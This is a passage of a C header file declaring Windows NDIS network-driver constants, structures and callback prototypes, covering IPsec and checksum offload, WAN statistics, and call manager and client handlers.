#define	NDIS_DEVICE_NOT_STOPPABLE                 0x00000001
#define	NDIS_DEVICE_NOT_REMOVEABLE                0x00000002
#define	NDIS_DEVICE_NOT_SUSPENDABLE               0x00000004
#define NDIS_DEVICE_DISABLE_PM                    0x00000008
#define NDIS_DEVICE_DISABLE_WAKE_UP               0x00000010
#define NDIS_DEVICE_DISABLE_WAKE_ON_RECONNECT     0x00000020
#define NDIS_DEVICE_RESERVED                      0x00000040
#define NDIS_DEVICE_DISABLE_WAKE_ON_MAGIC_PACKET  0x00000080
#define NDIS_DEVICE_DISABLE_WAKE_ON_PATTERN_MATCH 0x00000100

/* Protocol types supported by NDIS */
#define	NDIS_PROTOCOL_ID_DEFAULT        0x00
#define	NDIS_PROTOCOL_ID_TCP_IP         0x02
#define	NDIS_PROTOCOL_ID_IPX            0x06
#define	NDIS_PROTOCOL_ID_NBF            0x07
#define	NDIS_PROTOCOL_ID_MAX            0x0F
#define	NDIS_PROTOCOL_ID_MASK           0x0F

typedef ULONG NDIS_AF, *PNDIS_AF;

#define CO_ADDRESS_FAMILY_Q2931           ((NDIS_AF)0x1)
#define CO_ADDRESS_FAMILY_PSCHED          ((NDIS_AF)0x2)
#define CO_ADDRESS_FAMILY_L2TP            ((NDIS_AF)0x3)
#define CO_ADDRESS_FAMILY_IRDA            ((NDIS_AF)0x4)
#define CO_ADDRESS_FAMILY_1394            ((NDIS_AF)0x5)
#define CO_ADDRESS_FAMILY_PPP             ((NDIS_AF)0x6)
#define CO_ADDRESS_FAMILY_INFINIBAND      ((NDIS_AF)0x7)
#define CO_ADDRESS_FAMILY_TAPI            ((NDIS_AF)0x800)
#define CO_ADDRESS_FAMILY_TAPI_PROXY      ((NDIS_AF)0x801)

#define CO_ADDRESS_FAMILY_PROXY           0x80000000

typedef struct _CO_ADDRESS_FAMILY {
  NDIS_AF AddressFamily;
  ULONG MajorVersion;
  ULONG MinorVersion;
} CO_ADDRESS_FAMILY, *PCO_ADDRESS_FAMILY;

typedef struct _CO_SPECIFIC_PARAMETERS {
  ULONG  ParamType;
  ULONG  Length;
  UCHAR  Parameters[1];
} CO_SPECIFIC_PARAMETERS, *PCO_SPECIFIC_PARAMETERS;

typedef struct _CO_CALL_MANAGER_PARAMETERS {
  FLOWSPEC  Transmit;
  FLOWSPEC  Receive;
  CO_SPECIFIC_PARAMETERS  CallMgrSpecific;
} CO_CALL_MANAGER_PARAMETERS, *PCO_CALL_MANAGER_PARAMETERS;

/* CO_MEDIA_PARAMETERS.Flags constants */
#define RECEIVE_TIME_INDICATION           0x00000001
#define USE_TIME_STAMPS                   0x00000002
#define TRANSMIT_VC                       0x00000004
#define RECEIVE_VC                        0x00000008
#define INDICATE_ERRED_PACKETS            0x00000010
#define INDICATE_END_OF_TX                0x00000020
#define RESERVE_RESOURCES_VC              0x00000040
#define	ROUND_DOWN_FLOW                   0x00000080
#define	ROUND_UP_FLOW                     0x00000100

typedef struct _CO_MEDIA_PARAMETERS {
  ULONG  Flags;
  ULONG  ReceivePriority;
  ULONG  ReceiveSizeHint;
  CO_SPECIFIC_PARAMETERS  MediaSpecific;
} CO_MEDIA_PARAMETERS, *PCO_MEDIA_PARAMETERS;

/* CO_CALL_PARAMETERS.Flags constants */
#define PERMANENT_VC                      0x00000001
#define CALL_PARAMETERS_CHANGED           0x00000002
#define QUERY_CALL_PARAMETERS             0x00000004
#define BROADCAST_VC                      0x00000008
#define MULTIPOINT_VC                     0x00000010

typedef struct _CO_CALL_PARAMETERS {
  ULONG  Flags;
  PCO_CALL_MANAGER_PARAMETERS  CallMgrParameters;
  PCO_MEDIA_PARAMETERS  MediaParameters;
} CO_CALL_PARAMETERS, *PCO_CALL_PARAMETERS;

typedef struct _CO_SAP {
  ULONG SapType;
  ULONG SapLength;
  UCHAR Sap[1];
} CO_SAP, *PCO_SAP;

#if NDIS_LEGACY_DRIVER
typedef struct _NDIS_IPSEC_PACKET_INFO {
  __MINGW_EXTENSION union {
    struct {
      NDIS_HANDLE OffloadHandle;
      NDIS_HANDLE NextOffloadHandle;
    } Transmit;
    struct {
      ULONG SA_DELETE_REQ:1;
      ULONG CRYPTO_DONE:1;
      ULONG NEXT_CRYPTO_DONE:1;
      ULONG CryptoStatus;
    } Receive;
  };
} NDIS_IPSEC_PACKET_INFO, *PNDIS_IPSEC_PACKET_INFO;
#endif

#if (NDIS_SUPPORT_NDIS6 || NDIS60)
typedef struct _NDIS_IPSEC_OFFLOAD_V1_NET_BUFFER_LIST_INFO {
  __MINGW_EXTENSION union {
    struct {
      NDIS_HANDLE OffloadHandle;
    } Transmit;
    struct {
      USHORT SaDeleteReq:1;
      USHORT CryptoDone:1;
      USHORT NextCryptoDone:1;
      USHORT Pad:13;
      USHORT CryptoStatus;
    } Receive;
  };
} NDIS_IPSEC_OFFLOAD_V1_NET_BUFFER_LIST_INFO, *PNDIS_IPSEC_OFFLOAD_V1_NET_BUFFER_LIST_INFO;
#endif

/* NDIS_MAC_FRAGMENT.Errors constants */
#define WAN_ERROR_CRC					0x00000001
#define WAN_ERROR_FRAMING				0x00000002
#define WAN_ERROR_HARDWAREOVERRUN			0x00000004
#define WAN_ERROR_BUFFEROVERRUN				0x00000008
#define WAN_ERROR_TIMEOUT				0x00000010
#define WAN_ERROR_ALIGNMENT				0x00000020

typedef struct _NDIS_MAC_FRAGMENT {
  NDIS_HANDLE  NdisLinkContext;
  ULONG  Errors;
} NDIS_MAC_FRAGMENT, *PNDIS_MAC_FRAGMENT;

typedef struct _NDIS_MAC_LINE_DOWN {
  NDIS_HANDLE  NdisLinkContext;
} NDIS_MAC_LINE_DOWN, *PNDIS_MAC_LINE_DOWN;

typedef struct _NDIS_MAC_LINE_UP {
  ULONG  LinkSpeed;
  NDIS_WAN_QUALITY  Quality;
  USHORT  SendWindow;
  NDIS_HANDLE  ConnectionWrapperID;
  NDIS_HANDLE  NdisLinkHandle;
  NDIS_HANDLE  NdisLinkContext;
} NDIS_MAC_LINE_UP, *PNDIS_MAC_LINE_UP;

typedef struct _NDIS_PACKET_8021Q_INFO {
  __MINGW_EXTENSION union {
    struct {
      UINT32 UserPriority:3;
      UINT32 CanonicalFormatId:1;
      UINT32 VlanId:12;
      UINT32 Reserved:16;
    } TagHeader;
    PVOID Value;
  };
} NDIS_PACKET_8021Q_INFO, *PNDIS_PACKET_8021Q_INFO;

typedef enum _NDIS_PER_PACKET_INFO {
  TcpIpChecksumPacketInfo,
  IpSecPacketInfo,
  TcpLargeSendPacketInfo,
  ClassificationHandlePacketInfo,
  NdisReserved,
  ScatterGatherListPacketInfo,
  Ieee8021QInfo,
  OriginalPacketInfo,
  PacketCancelId,
  OriginalNetBufferList,
  CachedNetBufferList,
  ShortPacketPaddingInfo,
  MaxPerPacketInfo
} NDIS_PER_PACKET_INFO, *PNDIS_PER_PACKET_INFO;

#if NDIS_LEGACY_DRIVER

typedef struct _NDIS_PACKET_EXTENSION {
  PVOID NdisPacketInfo[MaxPerPacketInfo];
} NDIS_PACKET_EXTENSION, *PNDIS_PACKET_EXTENSION;

typedef enum _NDIS_TASK {
  TcpIpChecksumNdisTask,
  IpSecNdisTask,
  TcpLargeSendNdisTask,
  MaxNdisTask
} NDIS_TASK, *PNDIS_TASK;

typedef enum _NDIS_ENCAPSULATION {
  UNSPECIFIED_Encapsulation,
  NULL_Encapsulation,
  IEEE_802_3_Encapsulation,
  IEEE_802_5_Encapsulation,
  LLC_SNAP_ROUTED_Encapsulation,
  LLC_SNAP_BRIDGED_Encapsulation
} NDIS_ENCAPSULATION;

typedef struct _NDIS_ENCAPSULATION_FORMAT {
  NDIS_ENCAPSULATION Encapsulation;
  struct {
    ULONG FixedHeaderSize:1;
    ULONG Reserved:31;
  } Flags;
  ULONG EncapsulationHeaderSize;
} NDIS_ENCAPSULATION_FORMAT, *PNDIS_ENCAPSULATION_FORMAT;

typedef struct _NDIS_TASK_OFFLOAD_HEADER {
  ULONG Version;
  ULONG Size;
  ULONG Reserved;
  ULONG OffsetFirstTask;
  NDIS_ENCAPSULATION_FORMAT EncapsulationFormat;
} NDIS_TASK_OFFLOAD_HEADER, *PNDIS_TASK_OFFLOAD_HEADER;

typedef struct _NDIS_TASK_OFFLOAD {
  ULONG Version;
  ULONG Size;
  NDIS_TASK Task;
  ULONG OffsetNextTask;
  ULONG TaskBufferLength;
  UCHAR TaskBuffer[1];
} NDIS_TASK_OFFLOAD, *PNDIS_TASK_OFFLOAD;

typedef struct _NDIS_TASK_TCP_IP_CHECKSUM {
  struct {
    ULONG IpOptionsSupported:1;
    ULONG TcpOptionsSupported:1;
    ULONG TcpChecksum:1;
    ULONG UdpChecksum:1;
    ULONG IpChecksum:1;
  } V4Transmit;
  struct {
    ULONG IpOptionsSupported:1;
    ULONG TcpOptionsSupported:1;
    ULONG TcpChecksum:1;
    ULONG UdpChecksum:1;
    ULONG IpChecksum:1;
  } V4Receive;
  struct {
    ULONG IpOptionsSupported:1;
    ULONG TcpOptionsSupported:1;
    ULONG TcpChecksum:1;
    ULONG UdpChecksum:1;
  } V6Transmit;
  struct {
    ULONG IpOptionsSupported:1;
    ULONG TcpOptionsSupported:1;
    ULONG TcpChecksum:1;
    ULONG UdpChecksum:1;
  } V6Receive;
} NDIS_TASK_TCP_IP_CHECKSUM, *PNDIS_TASK_TCP_IP_CHECKSUM;

#define NDIS_TASK_TCP_LARGE_SEND_V0 0

typedef struct _NDIS_TASK_TCP_LARGE_SEND {
  ULONG Version;
  ULONG MaxOffLoadSize;
  ULONG MinSegmentCount;
  BOOLEAN TcpOptions;
  BOOLEAN IpOptions;
} NDIS_TASK_TCP_LARGE_SEND, *PNDIS_TASK_TCP_LARGE_SEND;

typedef struct _NDIS_TASK_IPSEC {
  struct {
    ULONG AH_ESP_COMBINED;
    ULONG TRANSPORT_TUNNEL_COMBINED;
    ULONG V4_OPTIONS;
    ULONG RESERVED;
  } Supported;
  struct {
    ULONG MD5:1;
    ULONG SHA_1:1;
    ULONG Transport:1;
    ULONG Tunnel:1;
    ULONG Send:1;
    ULONG Receive:1;
  } V4AH;
  struct {
    ULONG DES:1;
    ULONG RESERVED:1;
    ULONG TRIPLE_DES:1;
    ULONG NULL_ESP:1;
    ULONG Transport:1;
    ULONG Tunnel:1;
    ULONG Send:1;
    ULONG Receive:1;
  } V4ESP;
} NDIS_TASK_IPSEC, *PNDIS_TASK_IPSEC;

#endif /* NDIS_LEGACY_DRIVER */

#define IPSEC_TPT_UDPESP_ENCAPTYPE_IKE                 0x00000001
#define IPSEC_TUN_UDPESP_ENCAPTYPE_IKE                 0x00000002
#define IPSEC_TPTOVERTUN_UDPESP_ENCAPTYPE_IKE          0x00000004
#define IPSEC_TPT_UDPESP_OVER_PURE_TUN_ENCAPTYPE_IKE   0x00000008
#define IPSEC_TPT_UDPESP_ENCAPTYPE_OTHER               0x00000010
#define IPSEC_TUN_UDPESP_ENCAPTYPE_OTHER               0x00000020
#define IPSEC_TPTOVERTUN_UDPESP_ENCAPTYPE_OTHER        0x00000040
#define IPSEC_TPT_UDPESP_OVER_PURE_TUN_ENCAPTYPE_OTHER 0x00000080

#if NDIS_LEGACY_DRIVER

/*
 * PNDIS_PACKET
 * NDIS_GET_ORIGINAL_PACKET(
 *   IN PNDIS_PACKET  Packet);
 */
#define NDIS_GET_ORIGINAL_PACKET(Packet) \
  NDIS_PER_PACKET_INFO_FROM_PACKET(Packet, OriginalPacketInfo)

/*
 * PVOID
 * NDIS_GET_PACKET_CANCEL_ID(
 *   IN PNDIS_PACKET  Packet);
 */
#define NDIS_GET_PACKET_CANCEL_ID(Packet) \
  NDIS_PER_PACKET_INFO_FROM_PACKET(Packet, PacketCancelId)

/*
 * PNDIS_PACKET_EXTENSION
 * NDIS_PACKET_EXTENSION_FROM_PACKET(
 *   IN PNDIS_PACKET  Packet);
 */
#define NDIS_PACKET_EXTENSION_FROM_PACKET(Packet) \
  ((PNDIS_PACKET_EXTENSION)((PUCHAR)(Packet) \
    + (Packet)->Private.NdisPacketOobOffset + sizeof(NDIS_PACKET_OOB_DATA)))

/*
 * PVOID
 * NDIS_PER_PACKET_INFO_FROM_PACKET(
 *   IN OUT  PNDIS_PACKET  Packet,
 *   IN NDIS_PER_PACKET_INFO  InfoType);
 */
#define NDIS_PER_PACKET_INFO_FROM_PACKET(Packet, InfoType) \
  ((PNDIS_PACKET_EXTENSION)((PUCHAR)(Packet) + (Packet)->Private.NdisPacketOobOffset \
    + sizeof(NDIS_PACKET_OOB_DATA)))->NdisPacketInfo[(InfoType)]

/*
 * VOID
 * NDIS_SET_ORIGINAL_PACKET(
 *   IN OUT  PNDIS_PACKET  Packet,
 *   IN PNDIS_PACKET  OriginalPacket);
 */
#define NDIS_SET_ORIGINAL_PACKET(Packet, OriginalPacket) \
  NDIS_PER_PACKET_INFO_FROM_PACKET(Packet, OriginalPacketInfo) = (OriginalPacket)

/*
 * VOID
 * NDIS_SET_PACKET_CANCEL_ID(
 *  IN PNDIS_PACKET  Packet
 *  IN ULONG_PTR  CancelId);
 */
#define NDIS_SET_PACKET_CANCEL_ID(Packet, CancelId) \
  NDIS_PER_PACKET_INFO_FROM_PACKET(Packet, PacketCancelId) = (CancelId)

#define NdisSetPacketCancelId(_Packet, _CancelId) NDIS_SET_PACKET_CANCEL_ID(_Packet, _CancelId)
#define NdisGetPacketCancelId(_Packet) NDIS_GET_PACKET_CANCEL_ID(_Packet)

#endif /* NDIS_LEGACY_DRIVER */

#if NDIS_SUPPORT_NDIS6
typedef struct _NDIS_GENERIC_OBJECT {
  NDIS_OBJECT_HEADER Header;
  PVOID Caller;
  PVOID CallersCaller;
  PDRIVER_OBJECT DriverObject;
} NDIS_GENERIC_OBJECT, *PNDIS_GENERIC_OBJECT;
#endif

/* NDIS_TASK_OFFLOAD_HEADER.Version constants */
#define NDIS_TASK_OFFLOAD_VERSION 1

#define MAX_HASHES                     4
#define TRUNCATED_HASH_LEN             12

#define CRYPTO_SUCCESS                   0
#define CRYPTO_GENERIC_ERROR             1
#define CRYPTO_TRANSPORT_AH_AUTH_FAILED  2
#define CRYPTO_TRANSPORT_ESP_AUTH_FAILED 3
#define CRYPTO_TUNNEL_AH_AUTH_FAILED     4
#define CRYPTO_TUNNEL_ESP_AUTH_FAILED    5
#define CRYPTO_INVALID_PACKET_SYNTAX     6
#define CRYPTO_INVALID_PROTOCOL          7

typedef struct _NDIS_TCP_IP_CHECKSUM_PACKET_INFO {
  __MINGW_EXTENSION union {
    struct {
      ULONG NdisPacketChecksumV4:1;
      ULONG NdisPacketChecksumV6:1;
      ULONG NdisPacketTcpChecksum:1;
      ULONG NdisPacketUdpChecksum:1;
      ULONG NdisPacketIpChecksum:1;
      } Transmit;
    struct {
      ULONG NdisPacketTcpChecksumFailed:1;
      ULONG NdisPacketUdpChecksumFailed:1;
      ULONG NdisPacketIpChecksumFailed:1;
      ULONG NdisPacketTcpChecksumSucceeded:1;
      ULONG NdisPacketUdpChecksumSucceeded:1;
      ULONG NdisPacketIpChecksumSucceeded:1;
      ULONG NdisPacketLoopback:1;
    } Receive;
    ULONG Value;
  };
} NDIS_TCP_IP_CHECKSUM_PACKET_INFO, *PNDIS_TCP_IP_CHECKSUM_PACKET_INFO;

typedef struct _NDIS_WAN_CO_FRAGMENT {
  ULONG Errors;
} NDIS_WAN_CO_FRAGMENT, *PNDIS_WAN_CO_FRAGMENT;

typedef struct _NDIS_WAN_FRAGMENT {
  UCHAR RemoteAddress[6];
  UCHAR LocalAddress[6];
} NDIS_WAN_FRAGMENT, *PNDIS_WAN_FRAGMENT;

typedef struct _WAN_CO_LINKPARAMS {
  ULONG TransmitSpeed;
  ULONG ReceiveSpeed;
  ULONG SendWindow;
} WAN_CO_LINKPARAMS, *PWAN_CO_LINKPARAMS;

typedef struct _NDIS_WAN_GET_STATS {
  UCHAR LocalAddress[6];
  ULONG BytesSent;
  ULONG BytesRcvd;
  ULONG FramesSent;
  ULONG FramesRcvd;
  ULONG CRCErrors;
  ULONG TimeoutErrors;
  ULONG AlignmentErrors;
  ULONG SerialOverrunErrors;
  ULONG FramingErrors;
  ULONG BufferOverrunErrors;
  ULONG BytesTransmittedUncompressed;
  ULONG BytesReceivedUncompressed;
  ULONG BytesTransmittedCompressed;
  ULONG BytesReceivedCompressed;
} NDIS_WAN_GET_STATS, *PNDIS_WAN_GET_STATS;

/* Call Manager */

typedef VOID
(NTAPI *CM_ACTIVATE_VC_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  CallMgrVcContext,
  IN PCO_CALL_PARAMETERS  CallParameters);

typedef NDIS_STATUS
(NTAPI *CM_ADD_PARTY_HANDLER)(
  IN NDIS_HANDLE  CallMgrVcContext,
  IN OUT PCO_CALL_PARAMETERS  CallParameters,
  IN NDIS_HANDLE  NdisPartyHandle,
  OUT PNDIS_HANDLE  CallMgrPartyContext);

typedef NDIS_STATUS
(NTAPI *CM_CLOSE_AF_HANDLER)(
  IN NDIS_HANDLE  CallMgrAfContext);

typedef NDIS_STATUS
(NTAPI *CM_CLOSE_CALL_HANDLER)(
  IN NDIS_HANDLE  CallMgrVcContext,
  IN NDIS_HANDLE  CallMgrPartyContext  OPTIONAL,
  IN PVOID  CloseData  OPTIONAL,
  IN UINT  Size  OPTIONAL);

typedef NDIS_STATUS
(NTAPI *CM_DEREG_SAP_HANDLER)(
  IN NDIS_HANDLE  CallMgrSapContext);

typedef VOID
(NTAPI *CM_DEACTIVATE_VC_COMPLETE_HANDLER)(
	IN NDIS_STATUS  Status,
	IN NDIS_HANDLE  CallMgrVcContext);

typedef NDIS_STATUS
(NTAPI *CM_DROP_PARTY_HANDLER)(
  IN NDIS_HANDLE  CallMgrPartyContext,
  IN PVOID  CloseData  OPTIONAL,
  IN UINT  Size  OPTIONAL);

typedef VOID
(NTAPI *CM_INCOMING_CALL_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  CallMgrVcContext,
  IN PCO_CALL_PARAMETERS  CallParameters);

typedef NDIS_STATUS
(NTAPI *CM_MAKE_CALL_HANDLER)(
  IN NDIS_HANDLE  CallMgrVcContext,
  IN OUT PCO_CALL_PARAMETERS  CallParameters,
  IN NDIS_HANDLE  NdisPartyHandle	OPTIONAL,
  OUT PNDIS_HANDLE  CallMgrPartyContext  OPTIONAL);

typedef NDIS_STATUS
(NTAPI *CM_MODIFY_CALL_QOS_HANDLER)(
  IN NDIS_HANDLE  CallMgrVcContext,
  IN PCO_CALL_PARAMETERS  CallParameters);

typedef NDIS_STATUS
(NTAPI *CM_OPEN_AF_HANDLER)(
	IN NDIS_HANDLE  CallMgrBindingContext,
	IN PCO_ADDRESS_FAMILY  AddressFamily,
	IN NDIS_HANDLE  NdisAfHandle,
	OUT PNDIS_HANDLE  CallMgrAfContext);

typedef NDIS_STATUS
(NTAPI *CM_REG_SAP_HANDLER)(
  IN NDIS_HANDLE  CallMgrAfContext,
  IN PCO_SAP  Sap,
  IN NDIS_HANDLE  NdisSapHandle,
  OUT	PNDIS_HANDLE  CallMgrSapContext);

typedef NDIS_STATUS
(NTAPI *CO_CREATE_VC_HANDLER)(
  IN NDIS_HANDLE  ProtocolAfContext,
  IN NDIS_HANDLE  NdisVcHandle,
  OUT PNDIS_HANDLE  ProtocolVcContext);

typedef NDIS_STATUS
(NTAPI *CO_DELETE_VC_HANDLER)(
  IN NDIS_HANDLE  ProtocolVcContext);

#define PROTOCOL_RESERVED_SIZE_IN_PACKET (4 * sizeof(PVOID))

/* Prototypes for NDIS 5.0 protocol characteristics */

typedef VOID
(NTAPI *CO_SEND_COMPLETE_HANDLER)(
  IN NDIS_STATUS Status,
  IN NDIS_HANDLE ProtocolVcContext,
  IN PNDIS_PACKET Packet);

typedef VOID
(NTAPI *CO_STATUS_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN NDIS_HANDLE ProtocolVcContext OPTIONAL,
  IN NDIS_STATUS GeneralStatus,
  IN PVOID StatusBuffer,
  IN UINT StatusBufferSize);

typedef UINT
(NTAPI *CO_RECEIVE_PACKET_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN NDIS_HANDLE ProtocolVcContext,
  IN PNDIS_PACKET Packet);

typedef NDIS_STATUS
(NTAPI *CO_REQUEST_HANDLER)(
  IN NDIS_HANDLE ProtocolAfContext,
  IN NDIS_HANDLE ProtocolVcContext OPTIONAL,
  IN NDIS_HANDLE ProtocolPartyContext OPTIONAL,
  IN OUT PNDIS_REQUEST NdisRequest);

typedef VOID
(NTAPI *CO_REQUEST_COMPLETE_HANDLER)(
  IN NDIS_STATUS Status,
  IN NDIS_HANDLE ProtocolAfContext OPTIONAL,
  IN NDIS_HANDLE ProtocolVcContext OPTIONAL,
  IN NDIS_HANDLE ProtocolPartyContext OPTIONAL,
  IN PNDIS_REQUEST NdisRequest);

typedef struct _NDIS_CALL_MANAGER_CHARACTERISTICS {
	UCHAR  MajorVersion;
	UCHAR  MinorVersion;
	USHORT  Filler;
	UINT  Reserved;
	CO_CREATE_VC_HANDLER  CmCreateVcHandler;
	CO_DELETE_VC_HANDLER  CmDeleteVcHandler;
	CM_OPEN_AF_HANDLER  CmOpenAfHandler;
	CM_CLOSE_AF_HANDLER	 CmCloseAfHandler;
	CM_REG_SAP_HANDLER  CmRegisterSapHandler;
	CM_DEREG_SAP_HANDLER  CmDeregisterSapHandler;
	CM_MAKE_CALL_HANDLER  CmMakeCallHandler;
	CM_CLOSE_CALL_HANDLER  CmCloseCallHandler;
	CM_INCOMING_CALL_COMPLETE_HANDLER  CmIncomingCallCompleteHandler;
	CM_ADD_PARTY_HANDLER  CmAddPartyHandler;
	CM_DROP_PARTY_HANDLER  CmDropPartyHandler;
	CM_ACTIVATE_VC_COMPLETE_HANDLER  CmActivateVcCompleteHandler;
	CM_DEACTIVATE_VC_COMPLETE_HANDLER  CmDeactivateVcCompleteHandler;
	CM_MODIFY_CALL_QOS_HANDLER  CmModifyCallQoSHandler;
	CO_REQUEST_HANDLER  CmRequestHandler;
	CO_REQUEST_COMPLETE_HANDLER  CmRequestCompleteHandler;
} NDIS_CALL_MANAGER_CHARACTERISTICS, *PNDIS_CALL_MANAGER_CHARACTERISTICS;



/* Call Manager clients */

typedef VOID (*CL_OPEN_AF_COMPLETE_HANDLER)(
  IN NDIS_STATUS Status,
  IN NDIS_HANDLE ProtocolAfContext,
  IN NDIS_HANDLE NdisAfHandle);

typedef VOID
(NTAPI *CL_CLOSE_AF_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  ProtocolAfContext);

typedef VOID
(NTAPI *CL_REG_SAP_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  ProtocolSapContext,
  IN PCO_SAP  Sap,
  IN NDIS_HANDLE  NdisSapHandle);

typedef VOID
(NTAPI *CL_DEREG_SAP_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  ProtocolSapContext);

typedef VOID
(NTAPI *CL_MAKE_CALL_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  ProtocolVcContext,
  IN NDIS_HANDLE  NdisPartyHandle  OPTIONAL,
  IN PCO_CALL_PARAMETERS  CallParameters);

typedef VOID
(NTAPI *CL_MODIFY_CALL_QOS_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  ProtocolVcContext,
  IN PCO_CALL_PARAMETERS  CallParameters);

typedef VOID
(NTAPI *CL_CLOSE_CALL_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  ProtocolVcContext,
  IN NDIS_HANDLE  ProtocolPartyContext  OPTIONAL);

typedef VOID
(NTAPI *CL_ADD_PARTY_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  ProtocolPartyContext,
  IN NDIS_HANDLE  NdisPartyHandle,
  IN PCO_CALL_PARAMETERS  CallParameters);

typedef VOID
(NTAPI *CL_DROP_PARTY_COMPLETE_HANDLER)(
  IN NDIS_STATUS  Status,
  IN NDIS_HANDLE  ProtocolPartyContext);

typedef NDIS_STATUS
(NTAPI *CL_INCOMING_CALL_HANDLER)(
  IN NDIS_HANDLE  ProtocolSapContext,
  IN NDIS_HANDLE  ProtocolVcContext,
  IN OUT PCO_CALL_PARAMETERS  CallParameters);

typedef VOID
(NTAPI *CL_INCOMING_CALL_QOS_CHANGE_HANDLER)(
  IN NDIS_HANDLE  ProtocolVcContext,
  IN PCO_CALL_PARAMETERS  CallParameters);

typedef VOID
(NTAPI *CL_INCOMING_CLOSE_CALL_HANDLER)(
  IN NDIS_STATUS  CloseStatus,
  IN NDIS_HANDLE  ProtocolVcContext,
  IN PVOID  CloseData  OPTIONAL,
  IN UINT  Size  OPTIONAL);

typedef VOID
(NTAPI *CL_INCOMING_DROP_PARTY_HANDLER)(
  IN NDIS_STATUS  DropStatus,
  IN NDIS_HANDLE  ProtocolPartyContext,
  IN PVOID  CloseData  OPTIONAL,
  IN UINT  Size  OPTIONAL);

typedef VOID
(NTAPI *CL_CALL_CONNECTED_HANDLER)(
  IN NDIS_HANDLE  ProtocolVcContext);


typedef struct _NDIS_CLIENT_CHARACTERISTICS {
  UCHAR  MajorVersion;
  UCHAR  MinorVersion;
  USHORT  Filler;
  UINT  Reserved;
  CO_CREATE_VC_HANDLER  ClCreateVcHandler;
  CO_DELETE_VC_HANDLER  ClDeleteVcHandler;
  CO_REQUEST_HANDLER  ClRequestHandler;
  CO_REQUEST_COMPLETE_HANDLER  ClRequestCompleteHandler;
  CL_OPEN_AF_COMPLETE_HANDLER  ClOpenAfCompleteHandler;
  CL_CLOSE_AF_COMPLETE_HANDLER  ClCloseAfCompleteHandler;
  CL_REG_SAP_COMPLETE_HANDLER  ClRegisterSapCompleteHandler;
  CL_DEREG_SAP_COMPLETE_HANDLER  ClDeregisterSapCompleteHandler;
  CL_MAKE_CALL_COMPLETE_HANDLER  ClMakeCallCompleteHandler;
  CL_MODIFY_CALL_QOS_COMPLETE_HANDLER	 ClModifyCallQoSCompleteHandler;
  CL_CLOSE_CALL_COMPLETE_HANDLER  ClCloseCallCompleteHandler;
  CL_ADD_PARTY_COMPLETE_HANDLER  ClAddPartyCompleteHandler;
  CL_DROP_PARTY_COMPLETE_HANDLER  ClDropPartyCompleteHandler;
  CL_INCOMING_CALL_HANDLER  ClIncomingCallHandler;
  CL_INCOMING_CALL_QOS_CHANGE_HANDLER  ClIncomingCallQoSChangeHandler;
  CL_INCOMING_CLOSE_CALL_HANDLER  ClIncomingCloseCallHandler;
  CL_INCOMING_DROP_PARTY_HANDLER  ClIncomingDropPartyHandler;
  CL_CALL_CONNECTED_HANDLER  ClCallConnectedHandler;
} NDIS_CLIENT_CHARACTERISTICS, *PNDIS_CLIENT_CHARACTERISTICS;


/* NDIS protocol structures */

/* Prototypes for NDIS 3.0 protocol characteristics */

typedef VOID
(NTAPI *OPEN_ADAPTER_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN NDIS_STATUS Status,
  IN NDIS_STATUS OpenErrorStatus);

typedef VOID
(NTAPI *CLOSE_ADAPTER_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN NDIS_STATUS Status);

typedef VOID
(NTAPI *RESET_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN NDIS_STATUS Status);

typedef VOID
(NTAPI *REQUEST_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN PNDIS_REQUEST NdisRequest,
  IN NDIS_STATUS Status);

typedef VOID
(NTAPI *STATUS_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN NDIS_STATUS GeneralStatus,
  IN PVOID StatusBuffer,
  IN UINT StatusBufferSize);

typedef VOID
(NTAPI *STATUS_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext);

typedef VOID
(NTAPI *SEND_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN PNDIS_PACKET Packet,
  IN NDIS_STATUS Status);

typedef VOID
(NTAPI *WAN_SEND_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN PNDIS_WAN_PACKET Packet,
  IN NDIS_STATUS Status);

typedef VOID
(NTAPI *TRANSFER_DATA_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN PNDIS_PACKET Packet,
  IN NDIS_STATUS Status,
  IN UINT BytesTransferred);

typedef VOID
(NTAPI *WAN_TRANSFER_DATA_COMPLETE_HANDLER)(
  VOID);

typedef NDIS_STATUS
(NTAPI *RECEIVE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext,
  IN NDIS_HANDLE MacReceiveContext,
  IN PVOID HeaderBuffer,
  IN UINT HeaderBufferSize,
  IN PVOID LookAheadBuffer,
  IN UINT LookaheadBufferSize,
  IN UINT PacketSize);

typedef NDIS_STATUS
(NTAPI *WAN_RECEIVE_HANDLER)(
  IN NDIS_HANDLE NdisLinkHandle,
  IN PUCHAR Packet,
  IN ULONG PacketSize);

typedef VOID
(NTAPI *RECEIVE_COMPLETE_HANDLER)(
  IN NDIS_HANDLE ProtocolBindingContext);

/* Protocol characteristics for NDIS 3.0 protocols */

#define NDIS30_PROTOCOL_CHARACTERISTICS_S \
  UCHAR  MajorNdisVersion; \
  UCHAR  MinorNdisVersion; \
  USHORT  Filler; \
  _ANONYMOUS_UNION union { \
    UINT  Reserved; \
    UINT  Flags; \
  } DUMMYUNIONNAME; \
